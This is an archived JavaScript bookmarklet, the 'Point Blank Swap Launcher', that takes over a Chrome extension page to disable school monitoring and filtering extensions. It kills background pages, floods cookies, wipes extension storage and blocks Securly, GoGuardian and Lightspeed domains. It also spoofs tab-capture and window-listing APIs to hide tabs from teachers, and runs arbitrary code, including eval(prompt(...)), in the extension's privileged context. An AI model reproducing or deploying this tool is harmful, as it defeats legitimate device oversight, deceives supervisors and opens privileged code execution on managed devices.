var _____WB$wombat$assign$function_____ = function (name) {
    return (
        (self._wb_wombat &&
            self._wb_wombat.local_init &&
            self._wb_wombat.local_init(name)) ||
        self[name]
    );
};
if (!self.__WB_pmw) {
    self.__WB_pmw = function (obj) {
        this.__WB_source = obj;
        return this;
    };
}
{
    let window = _____WB$wombat$assign$function_____("window");
    let self = _____WB$wombat$assign$function_____("self");
    let document = _____WB$wombat$assign$function_____("document");
    let location = _____WB$wombat$assign$function_____("location");
    let top = _____WB$wombat$assign$function_____("top");
    let parent = _____WB$wombat$assign$function_____("parent");
    let frames = _____WB$wombat$assign$function_____("frames");
    let opener = _____WB$wombat$assign$function_____("opener");

    javascript: document = window.document;
    var launcher, swamp;
    (swamp = {
        background: opener
            ? opener.chrome.extension.getBackgroundPage()
            : frames[0].chrome.extension.getBackgroundPage(),
        save: function () {
            localStorage.swamp = document.getElementById("code").value;
        },
        elements: {
            create(e, t) {
                var o = document.createElement(e.tag),
                    a = swamp.strings[t?.id] || swamp.strings;
                for (var i in e)
                    o[i] = i.startsWith("on") ? swamp.functions[e[i]] : e[i];
                !e.kids && a[o.id] && (o.innerHTML = a[o.id]),
                    (t || document.body).appendChild(o),
                    (swamp.elements[e.id] = o),
                    e.kids?.forEach((e) => {
                        swamp.elements.create(e, o);
                    });
            },
        },
        functions: {
            save_code: function () {
                localStorage.setItem(
                    "code",
                    document.getElementById("code").value,
                );
            },
        },
    }),
        (document.documentElement.innerHTML = `<html>
  <body>
    <center>
      <head>
        <h1>[Point Blank Swap Launcher]</h1>
        <center><h1>---Disabling---</h1></center>

        <center><button id="soft">Soft Kill</button></center>
        <center><button id="hard">Hard Kill</button></center>
        <center><button id="cookies">Kill Extension By Cache</button></center>
        <center><button id="reload">Reload Blocker</button></center>
        <center>
        <hr/>

          <center><h1>---Scripts---</h1></center>
          <center>
       <select id="scripts">
<option> Pick  a script </option>
<option value="dns">
       Dns emulator
       </option>
       <option value="hide">
Hide Tabs from teachers
</option>
<option value="when">
Run Custom code on extension click
</option>
<option value="dnsonclick">
Toggle DNS Emulator on extension click
</option>
<option value="goofy">
Display Goofy Notification
</option>
<option value="policy">
Display Extension policy
</option>
<option value="google">
Open Cool Looking Window
</option>
<option value="visible"> Open Visible Window </option>

       </select>
       <button id="run_script">Run Script</button>
       
       <hr/>
              <center></center>
              <center>
                <center>
                  <center><h3>Run scripts as background</h3></center>
                  <h3 id="permissions">
                  </h3>
                  <h5> You can see the apis your extension holds above, for this to work, include a "." before your code (e.g, ".alert('1')" either running that as background or regularlly, note this will not work for functions (e.g, ".function(){alert('1')}") it'll only work for API functions, or strings (e.g, ".chrome.runtime.getManifest().permissions.forEach(e=>{alert(e)})") ) </li></h5>
                  <textarea id="code" placeholder="Code Goes Here..."></textarea>
                  </center>
                <center>
                <button id="rundir">Run on this page</button>
                  <button id="background">Run on this page as background</button>
                  <button id="reset">Reset Background Scripts</button>
                </center>
                <center></center>
      </head>
    </center>
  </body>
</html>

<style>
  box-sizing: border-box;

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      transition: background 0.2s linear;
    }
    .checkbox {
      opacity: 0;
      position: absolute;
    }

    .label {
      width: 50px;
      height: 26px;
      background-color: #111;
      display: flex;
      border-radius: 50px;
      align-items: center;
      justify-content: space-between;
      padding: 5px;
      position: relative;
      transform: scale(1.5);
    }

    .ball {
      width: 20px;
      height: 20px;
      background-color: white;
      position: absolute;
      top: 2px;
      left: 2px;
      border-radius: 50%;
      transition: transform 0.2s linear;
    }

    .checkbox:checked + .label .ball {
      transform: translateX(24px);
    }

 textarea{border-radius: 25px; margin: 1 auto;margin-center: auto;margin-center: auto; text-align: center; align: center; display:inline-block;height:400px}*{box-sizing:border-box}body{padding:13px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}input {border-radius: 6px; color:#000;font-size:15px} textarea {border-radius: 21px; color:#000;font-size:15px} button,pre { border-radius: 12px; color:#000;font-size:15px}h1,h2,h3,h4,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select{background-color:#fff;border-radius:15px; padding:13px 17px;border:none}button,input{background-color:#fff;padding:13px 100px;margin:20 5px 5px 0}input{width:600px;border-radius:10px}textarea{white-space:pre;float:center;width:60%;border-radius:25px; 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:25; 10px 10px 0;padding:13px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none; cursor:pointer;transition:filter 250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}</style>`),
        (document.getElementById("code").onkeydown = function () {
            localStorage.swamp = this.value;
        }),
        document
            .getElementById("reload")
            .addEventListener("click", function () {
                window + document.getElementById("code").value;
            }),
        (document.getElementById("rundir").onclick = function () {
            try {
                window += document.getElementById("code").value;
            } catch (e) {
                alert(e);
            }
        }),
        document.getElementById("background").addEventListener(
            "click",
            function () {
                alert("1");
                opener.chrome.extension.getBackgroundPage().al +
                    document.getElementById("code").value;
            },
            !1,
        ),
        document.getElementById("cookies").addEventListener(
            "click",
            function () {
                if (
                    confirm(
                        "This will slow your device for a estimated time of 15 seconds, if this page freezes, you will still be able to navigate to other tabs, continue?",
                    )
                ) {
                    for (var i = 0; i < localStorage.length; i++)
                        if (localStorage.key(i) !== "swamp")
                            localStorage[localStorage.key(i)] = "-";
                    (swamp.background || window).location.reload();
                } else {
                    return;
                }
            },
            !1,
        ),
        document.getElementById("hard").addEventListener("click", function () {
            try {
                ((e) => {
                    for (
                        var o = 32 * parseInt(99), t = 9e14, r = 0;
                        r < 100;
                        r++
                    )
                        opener.chrome.cookies.set({
                            url: opener.location.href,
                            name: "Hard-Disable",
                            value: `cd${r}=${encodeURIComponent(
                                btoa(
                                    String.fromCharCode.apply(
                                        0,
                                        crypto.getRandomValues(
                                            new Uint8Array(o),
                                        ),
                                    ),
                                ),
                            ).substring(0, o)};`,
                            path: "/",
                            expirationDate: t,
                        });
                    alert("OK");
                })();
            } catch (e) {
                alert(e);
            }
            document.getElementById("hard").innerHTML = "Disabled!";
        }),
        (document.getElementById("soft").onclick = function () {
            try {
                setInterval(function () {
                    opener.chrome.extension
                        .getBackgroundPage()
                        .location.reload() &&
                        opener.chrome.extension.getBackgroundPage().stop();
                }, 1);
                document.getElementById("soft").innerHTML = "Disabled!";
            } catch (e) {
                alert(e);
            }
        });
    opener.chrome.runtime.getManifest().permissions.forEach((show) => {
        document.getElementById("permissions").innerHTML +=
            `<br> ${show} <br/>`;
    });
    document.getElementById("reset").addEventListener(
        "click",
        function () {
            (onbeforeunload = null), (location.href = opener.location.href);
        },
        !1,
    ),
        document.getElementById("run_script").addEventListener(
            "click",
            function () {
                var scripts = document.getElementById("scripts");
                if (scripts.value == "visible") {
                    opener.chrome.tabs.captureVisibleTabAsync =
                        opener.chrome.tabs.captureVisibleTabAsync ||
                        screenshot_old;
                    opener.chrome.windows.getAllAsync =
                        opener.chrome.windows.getAllAsync || get_tabs_old;
                    clearInterval(spoof_int);
                    spoof_int
                        ? null
                        : alert(
                              "Your teacher can see all of your open tabs and windows!",
                          );
                    spoof_int = null;
                }
                if (scripts.value == "dnsonclick") {
                    function block() {
                        return {redirectUrl: "javascript:"};
                    }
                    var blocking = false;
                    function toggle() {
                        if (blocking) {
                            opener.chrome.extension
                                .getBackgroundPage()
                                .chrome.webRequest.onBeforeRequest.removeListener(
                                    block,
                                );
                        } else {
                            opener.chrome.extension
                                .getBackgroundPage()
                                .chrome.webRequest.onBeforeRequest.addListener(
                                    block,
                                    {
                                        urls: [
                                            "*://*.securly.com/*",
                                            "*://*.blocked.com/*",
                                            "*://*.lightspeedsystems.com/*",
                                            "*://*.goguardian.com/*",
                                            "*://*.blocking.com/*",
                                            "*://*.block.com/*",
                                            `*chrome-extension://*${document.domain}/*blocking/*`,
                                            `chrome-extension://${document.domain}/blocked.html/*`,
                                            "*/blocked/*",
                                            "*/block/*",
                                            "*/blocking/*",
                                            "/blocking/",
                                            opener.location.href,
                                        ],
                                    },
                                    ["blocking"],
                                );
                        }
                        blocking = !blocking;
                        opener.chrome.extension
                            .getBackgroundPage()
                            .chrome.tabs.query({
                                active: true,
                                currentWindow: true,
                            });
                    }
                    toggle();
                    opener.chrome.extension
                        .getBackgroundPage()
                        .chrome.browserAction.onClicked.addListener(toggle);
                    alert("Click your extension to toggle DNS Emulator");
                }
                if (scripts.value == "dns") {
                    opener.chrome.extension
                        .getBackgroundPage()
                        .chrome.webRequest.onBeforeRequest.addListener(
                            () => {
                                return {redirectUrl: "javascript:"};
                            },
                            {
                                urls: [
                                    "*://*.securly.com/*",
                                    "*://*.blocked.com/*",
                                    "*://*.lightspeedsystems.com/*",
                                    "*://*.goguardian.com/*",
                                    "*://*.blocking.com/*",
                                    "*://*.block.com/*",
                                    "*://*.blocked/*",
                                    "*://*.block/*",
                                    "*://*.blocking/*",
                                    opener.location.href,
                                ],
                            },
                            ["blocking"],
                        );
                    alert(
                        "Done, DNS Emulator has been turned on, you may close this tab, but not the extension tab",
                    );
                }
                if (scripts.value == "goofy") {
                    opener.chrome.notifications.create(null, {
                        iconUrl:
                            "https://web.archive.org/web/20240220033155/https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png",
                        type: "basic",
                        title: `Important Message`,
                        message:
                            "We've been trying to reach you concerning your vehicle's extended warranty. You should've received a notice in the mail about your car's extended warranty eligibility. Since we've not gotten a response, we're giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicle's warranty, press 1 to speak with a warranty specialist. ",
                    });
                }
                if (scripts.value == "policy") {
                    opener.chrome.storage.local.get("policy", function (json) {
                        alert(JSON.stringify(json));
                    });
                }
                if (scripts.value == "when") {
                    document.getElementById("code").value =
                        "eval(prompt('Code?'))";
                    document.getElementById("code").scrollIntoView();
                }
                if (scripts.value == "hide") {
                    var spoof_int,
                        visible_id = 0,
                        screenshot_old =
                            screenshot_old ||
                            opener.chrome.tabs.captureVisibleTabAsync,
                        get_tabs_old =
                            get_tabs_old || opener.chrome.windows.getAllAsync,
                        get_tabs_new = function () {
                            return new Promise((resolve, reject) => {
                                get_tabs_old({
                                    populate: true,
                                    windowTypes: ["normal"],
                                }).then((tabs) => {
                                    tabs.forEach((tab) => {
                                        if (tab.id === visible_id)
                                            resolve([tab]);
                                    });
                                });
                            });
                        };
                    opener.chrome.windows.create(
                        {
                            url: "https://web.archive.org/web/20240220033155/https://google.com",
                        },
                        (win) => {
                            visible_id = win.id;
                            spoof_int = setInterval(() => {
                                opener.chrome.windows.getLastFocused(
                                    (window) => {
                                        var visible = window.id === visible_id;
                                        opener.chrome.tabs.captureVisibleTabAsync =
                                            visible ? screenshot_old : null;
                                        opener.chrome.windows.getAllAsync =
                                            visible ? get_tabs_new : null;
                                    },
                                );
                            }, 5);
                        },
                    );
                }
                if (scripts.value == "google") {
                    opener.chrome.windows.create({
                        url: "https://web.archive.org/web/20240220033155/https://www.google.com",
                        type: "popup",
                    });
                }
            },
            !1,
        );
    setInterval(function () {
        if (!opener) {
            var iframe = document.createElement("iframe");
            iframe.src = `chrome-extension://${document.domain}/manifest.json`;
            iframe.style.display = "none";
            iframe.onload = function () {
                opener.chrome = frames[0].chrome;
            };
            document.body.appendChild(iframe);
        }
    }, 1);
    swamp.functions.save_code;
    document.getElementById("code").value = localStorage.code;
}
/*
     FILE ARCHIVED ON 03:31:55 Feb 20, 2024 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 01:10:34 May 13, 2024.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  captures_list: 0.847
  exclusion.robots: 0.103
  exclusion.robots.policy: 0.09
  esindex: 0.012
  cdx.remote: 6.941
  LoadShardBlock: 200.109 (3)
  PetaboxLoader3.datanode: 103.218 (4)
  PetaboxLoader3.resolve: 169.419 (2)
  load_resource: 150.977
*/
